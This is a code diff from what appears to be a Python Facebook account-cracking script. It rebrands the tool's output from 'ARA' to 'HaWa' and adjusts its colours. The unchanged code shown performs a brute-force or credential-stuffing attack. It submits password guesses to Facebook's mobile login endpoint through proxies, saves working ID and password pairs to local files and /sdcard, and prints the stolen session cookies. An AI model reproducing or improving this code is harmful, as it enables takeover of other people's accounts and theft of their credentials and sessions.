@@ -1062,7 +1062,7 @@ def crackmobile_ARA(idf,pwv,nmf):
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write(f'\r{N}[{PU}%sHaWa{Y}]-{PU}[%s/%s]{GR}[OK:%s]{R}[CP:%s]-[%s%s]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write(f'\r{N}[{PU}%sHaWa{Y}]-{PU}[%s/%s]{GR}[OK:%s]{N}[CP:%s]-[%s%s]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -1116,7 +1116,7 @@ def crackmobile_ARA(idf,pwv,nmf):
 }
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{N}[Omed-CP]{R}{idf}{R}|{R}{pw}{R}')
+				#print(f'\r{N}[Omed-CP]{R}{idf}{R}|{R}{pw}{R}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1126,11 +1126,11 @@ def crackmobile_ARA(idf,pwv,nmf):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{N}[ARA-OK]{G}{idf}{G}|{G}{pw}{PU}\n {PU}COOKIE : {kuki}')
+				print(f'\r{Y}[HaWa🌪️😼-OK]{PU}{idf}{N}|{GR}{pw}{PU}\n {R}COOKIE : {kuki}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_ARA(kuki)
 				open('/sdcard/ARA-OK.txt','a').write(f'{idf}|{pw}\n')
-				os.system('espeak -a 300 " ARA CRACKED OK ID"')
+				os.system('espeak -a 300 " HaWA CRACKED OK ID"')
 				break
 				
 			else:
